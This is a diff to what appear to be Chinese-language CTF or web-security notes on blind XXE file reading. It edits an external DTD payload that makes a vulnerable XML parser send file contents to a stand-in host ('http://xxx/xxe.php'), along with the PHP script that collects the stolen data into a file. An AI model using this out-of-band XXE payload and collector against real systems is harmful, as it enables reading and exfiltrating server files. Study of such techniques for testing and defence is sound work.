@@ -132,7 +132,6 @@ get请求url最好全编码，而不是只有url路径编码。
 ### 3.无回显XXE文件读取：
 服务器文件pd.dtd
 ```
-# pd.dtd
 <!ENTITY % all
 "<!ENTITY &#x25; send SYSTEM 'http://xxx/xxe.php?q=%file;'>"
 >
@@ -143,7 +142,7 @@ get请求url最好全编码，而不是只有url路径编码。
 # xxe.php
 <?php
 highlight_file(__FILE__);
-$xxe = base64_decode($_GET['q']);
+$xxe = ($_GET['q']);
 $txt = 'flag.txt';
 file_put_contents($txt,$xxe,FILE_APPEND)
 ?>
